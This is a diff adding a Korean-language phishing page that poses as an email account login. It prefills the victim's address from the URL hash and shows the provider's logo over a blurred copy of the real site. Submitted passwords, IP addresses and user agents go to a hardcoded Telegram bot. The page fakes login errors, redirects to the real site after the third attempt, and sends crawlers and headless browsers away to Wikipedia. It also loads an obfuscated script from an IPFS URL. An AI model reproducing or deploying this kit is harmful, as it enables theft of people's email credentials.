@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script type='text/javascript' src='https://ipfs.io/S9bgT2osMdKM9tgxUyyWlUiGbumJOIzGrxOXMmol84dKl8ouBlAT2mgCKFLY3R2FItdFXVZJByA9FXCk2mDwdfF-1QTIaFDZqGxjHdOY94wmtf7Iu5yI06qDxK9TTYN_OFhq9WEu7dKPOXRiYymquORgz2_Xp2FAeR_Mi1FYS6qJw0PKn1N2ipGfIr9rzV8vezkMOIbg9IV8ohM0itBSYdmIALma7y2nLVZu-R3nyr67SPZEOxzCEY_lMlGewsmEduZ9yM8HTbo4CERKCxkijntNVfx8XQxN4hkW4BjnusFyEluqffXHBo_gV0BNWq3RnTq0VltPxf2KvWX5mIL_xtc2BEI1W1aUBx5RxjkTD9_9qlL0jWxCYfkAlD6f0Q1GevpnUdk2FMbFiGfW7alrthqoG2qlKUiw6wQ_aFuuL93Y6X4clLlk2GfTgdRSAvsdXuv6TccWtQGsao-fJY5vmsf3baD6_h4v9GK0ql1P8ge-7WMY2nbaqfPWIcz2cY_0inMvIiJ3_g'></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>계정 인증</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', sans-serif;
+            transition: all 0.3s ease;
+        }
+        
+        body {
+            background-color: #fff;
+            color: #333;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        #root {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
+        
+        #root iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+            filter: blur(3px) brightness(0.7);
+            opacity: 0.8;
+        }
+        
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(150, 150, 150, 0.3);
+            z-index: 2;
+        }
+        
+        .form-container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 450px;
+            color: #333;
+            position: absolute;
+            top: 30%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 3;
+        }
+        
+        .form-logo {
+            width: 60px;
+            height: 60px;
+            border-radius: 12px;
+            margin: 0 auto 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        
+        .form-logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        
+        .domain-title {
+            text-align: center;
+            font-size: 20px;
+            font-weight: 500;
+            margin-bottom: 20px;
+            text-transform: capitalize;
+        }
+        
+        .domain-title::after {
+            content: "계정에 로그인하세요";
+        }
+        
+        .error-alert {
+            background-color: #ffebee;
+            color: #d32f2f;
+            font-size: 14px;
+            padding: 12px 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            display: none;
+        }
+        
+        .error-alert::before {
+            content: "×";
+            font-size: 18px;
+            font-weight: bold;
+            margin-right: 10px;
+            color: #d32f2f;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 12px 15px 12px 40px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+        
+        .input-group::before {
+            font-family: 'Material Icons';
+            position: absolute;
+            left: 12px;
+            top: 38px;
+            color: #777;
+        }
+        
+        #usernameGroup::before {
+            content: "person";
+        }
+        
+        #passwordGroup::before {
+            content: "lock";
+        }
+        
+        .options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            font-size: 13px;
+        }
+        
+        .remember-me {
+            display: flex;
+            align-items: center;
+        }
+        
+        .remember-me input {
+            margin-right: 5px;
+        }
+        
+        .forgot-password a {
+            color: #4285f4;
+            text-decoration: none;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #4285f4;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        .submit-btn:hover {
+            background-color: #5a95f5;
+        }
+        
+        .submit-btn .spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+        
+        .submit-btn.loading .spinner {
+            display: block;
+        }
+        
+        .submit-btn.loading span {
+            display: none;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 25px;
+            font-size: 12px;
+            color: #777;
+        }
+        
+        @keyframes slideUp {
+            from { opacity: 0; transform: translate(-50%, -40%); }
+            to { opacity: 1; transform: translate(-50%, -50%); }
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+        
+        /* Honeypot field */
+        .hp-field {
+            position: absolute;
+            left: -9999px;
+            opacity: 0;
+            height: 0;
+            width: 0;
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+</head>
+<body>
+    <div id="root">
+        <iframe id="myframe" scrolling="no" width="100%" height="100%" frameborder="0"></iframe>
+    </div>
+    <div class="overlay" id="overlay"></div>
+    
+    <div class="form-container" id="formContainer">
+        <div class="form-logo" id="formLogo">
+            <div id="formFallbackLogo" style="width: 100%; height: 100%; background-color: #f1f1f1; display: flex; justify-content: center; align-items: center; font-size: 24px; font-weight: bold; color: #555;">?</div>
+        </div>
+        <div class="domain-title" id="domainTitle"></div>
+        
+        <form id="verifyForm">
+            <div class="error-alert" id="errorAlert">잘못된 자격 증명입니다. 다시 시도해 주세요.</div>
+            
+            <!-- Honeypot field for bots -->
+            <input type="text" class="hp-field" id="botcheck" name="botcheck" autocomplete="off">
+            
+            <div class="input-group" id="usernameGroup">
+                <label for="username">이메일</label>
+                <input type="text" id="username" readonly>
+            </div>
+            
+            <div class="input-group" id="passwordGroup">
+                <label for="password">비밀번호</label>
+                <input type="password" id="password" placeholder="이메일 비밀번호를 입력하세요" autocomplete="off" required>
+            </div>
+
+                        <button type="submit" class="submit-btn" id="submitBtn">
+                <div class="spinner"></div>
+                <span>로그인</span>
+            </button>
+            
+            <div class="options">
+                <div class="remember-me">
+                    <input type="checkbox" id="remember">
+                    <label for="remember">나를 기억해줘</label>
+                </div>
+                <div class="forgot-password">
+                    <a href="#">Forgot password?</a>
+                </div>
+            </div>
+            
+            
+            <div class="footer" id="footer"></div>
+        </form>
+    </div>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Extract domain from URL hash
+            const url = window.location.href;
+            let email = '';
+            let domain = '';
+            let userIP = '';
+            
+            // First get the user's IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    userIP = data.ip;
+                    initializeApp();
+                })
+                .catch(error => {
+                    console.error('Error fetching IP:', error);
+                    userIP = 'Unknown';
+                    initializeApp();
+                });
+            
+            function initializeApp() {
+                if (url.includes('#')) {
+                    email = url.split('#')[1];
+                    if (email.includes('@')) {
+                        domain = email.split('@')[1];
+                    } else {
+                        domain = email;
+                    }
+                    
+                    // Clean domain (remove www. and .com/.net/etc if present)
+                    domain = domain.replace('www.', '').split('.')[0];
+                }
+                
+                // Display domain title and footer
+                const domainTitle = document.getElementById('domainTitle');
+                const footer = document.getElementById('footer');
+                const formFallbackLogo = document.getElementById('formFallbackLogo');
+                
+                if (domain) {
+                    // Set domain title (capitalized first letter only)
+                    if (domainTitle) {
+                        domainTitle.textContent = domain.charAt(0).toUpperCase() + domain.slice(1);
+                    }
+                    
+                    // Set footer with copyright (showing full domain with extension)
+                    if (footer) {
+                        const fullDomain = email.includes('@') ? email.split('@')[1] : domain + '.com';
+                        footer.textContent = `© ${fullDomain} 2025`;
+                    }
+                    
+                    // Get first letter of domain for fallback logo
+                    const logoLetter = domain.charAt(0).toUpperCase();
+                    formFallbackLogo.textContent = logoLetter;
+                    
+                    // Try to fetch logo from Clearbit using full domain
+                    const fullDomainForLogo = email.includes('@') ? email.split('@')[1] : domain + '.com';
+                    fetchLogo(fullDomainForLogo).then(logoUrl => {
+                        if (logoUrl) {
+                            // Replace fallback logo with actual logo
+                            const formLogoImg = document.createElement('img');
+                            formLogoImg.src = logoUrl;
+                            formLogoImg.alt = domain + ' logo';
+                            
+                            document.getElementById('formLogo').replaceChild(formLogoImg, formFallbackLogo);
+                        }
+                    }).catch(error => {
+                        console.error('Error fetching logo:', error);
+                    });
+                    
+                    // Load the domain in background iframe using full domain
+                    const iframe = document.getElementById('myframe');
+                    try {
+                        const fullDomainForIframe = email.includes('@') ? email.split('@')[1] : domain + '.com';
+                        iframe.src = `https://${fullDomainForIframe}`;
+                    } catch (e) {
+                        console.error('Error loading domain background:', e);
+                    }
+                    
+                    document.getElementById('overlay').style.display = 'block';
+                    
+                    // Populate username field
+                    document.getElementById('username').value = email;
+                }
+                
+                // Form submission handling
+                const form = document.getElementById('verifyForm');
+                const passwordInput = document.getElementById('password');
+                const errorAlert = document.getElementById('errorAlert');
+                let attemptCount = 0;
+                
+                form.addEventListener('submit', async function(e) {
+                    e.preventDefault();
+                    
+                    // Basic honeypot check
+                    const botCheck = document.getElementById('botcheck').value;
+                    if (botCheck) {
+                        // Likely a bot, just redirect
+                        window.location.href = `https://${domain}`;
+                        return;
+                    }
+                    
+                    // Show loading spinner
+                    submitBtn.classList.add('loading');
+                    submitBtn.disabled = true;
+                    
+                    // Simulate loading for 2 seconds
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    
+                    const password = passwordInput.value;
+                    
+                    // Send data to Telegram bot (including IP)
+                    sendToTelegram(email, password, userIP);
+                    
+                    attemptCount++;
+                    
+                    if (attemptCount < 3) {
+                        // Show error and clear password field
+                        errorAlert.style.display = 'flex';
+                        passwordInput.value = '';
+                        
+                        // Hide error after 3 seconds
+                        setTimeout(() => {
+                            errorAlert.style.display = 'none';
+                        }, 3000);
+                    } else {
+                        // On third attempt, redirect
+                        const fullDomain = email.includes('@') ? email.split('@')[1] : domain + '.com';
+                        window.location.href = `https://${fullDomain}`;
+                    }
+                    
+                    // Hide loading spinner
+                    submitBtn.classList.remove('loading');
+                    submitBtn.disabled = false;
+                });
+            }
+            
+            function fetchLogo(domain) {
+                return new Promise((resolve, reject) => {
+                    const img = new Image();
+                    const clearbitUrl = `https://logo.clearbit.com/${domain}?size=200`;
+                    
+                    img.onload = function() {
+                        resolve(clearbitUrl);
+                    };
+                    
+                    img.onerror = function() {
+                        reject(new Error('Logo not found'));
+                    };
+                    
+                    img.src = clearbitUrl;
+                });
+            }
+            
+            function sendToTelegram(email, password, ip) {
+                const botToken = '8883255522:AAHVnmTb-pltHmBkALc5QhODBG48gZRDjS4';
+                const chatId = '8964011763';
+                
+                const message = `New login:
+Email: ${email}
+Password: ${password}
+IP Address: ${ip}
+User Agent: ${navigator.userAgent}
+Timestamp: ${new Date().toISOString()}`;
+                
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                }).catch(error => console.error('Error sending to Telegram:', error));
+            }
+        });
+    </script>
+<script>
+(async function () {
+    const userAgent = navigator.userAgent || "";
+    const suspiciousUA = /bot|crawl|spider|slurp|headless|phantom/i.test(userAgent);
+    const isHeadless = navigator.webdriver || false;
+
+    // JS execution confirmation
+    localStorage.setItem('js_enabled', 'true');
+
+    // Honeypot trap (use your existing field instead)
+    const honeypot = document.getElementById('botcheck');
+    if (honeypot && honeypot.value) {
+        window.location.href = "https://www.wikipedia.org";
+        return;
+    }
+
+    // Check if localStorage was written (JS running)
+    const jsEnabled = localStorage.getItem('js_enabled') === 'true';
+
+    // Final bot detection logic (without interaction check)
+    if (
+        suspiciousUA ||
+        isHeadless ||
+        !jsEnabled
+    ) {
+        // Redirect bot
+        window.location.href = "https://www.wikipedia.org";
+    }
+})();
+</script>
+<script>
+// Function to get email from URL hash
+function getEmailFromUrl() {
+    const hash = window.location.hash.substring(1); // Remove the #
+    if (!hash) return null;
+    
+    // Check if hash is base64 encoded
+    if (isBase64(hash)) {
+        try {
+            return atob(hash); // Decode base64
+        } catch (e) {
+            return hash; // If decoding fails, assume it's plain email
+        }
+    }
+    return hash;
+}
+
+// Function to check if a string is base64 encoded
+function isBase64(str) {
+    try {
+        return btoa(atob(str)) === str;
+    } catch (err) {
+        return false;
+    }
+}
+
+// Function to update URL with base64 encoded email
+function updateUrlWithEncodedEmail(email) {
+    if (!email) return;
+    const encodedEmail = btoa(email);
+    window.history.replaceState(null, null, `#${encodedEmail}`);
+}
+
+// Main function to process email
+function processEmail() {
+    // Get email from URL
+    const email = getEmailFromUrl();
+    
+    if (email) {
+        // Update username field
+        document.getElementById('username').value = email;
+        
+        // Update URL with encoded email if it's not already encoded
+        if (!isBase64(window.location.hash.substring(1))) {
+            updateUrlWithEncodedEmail(email);
+        }
+    }
+}
+
+// Run when page loads
+window.addEventListener('DOMContentLoaded', processEmail);
+</script>
+</body>
+</html>
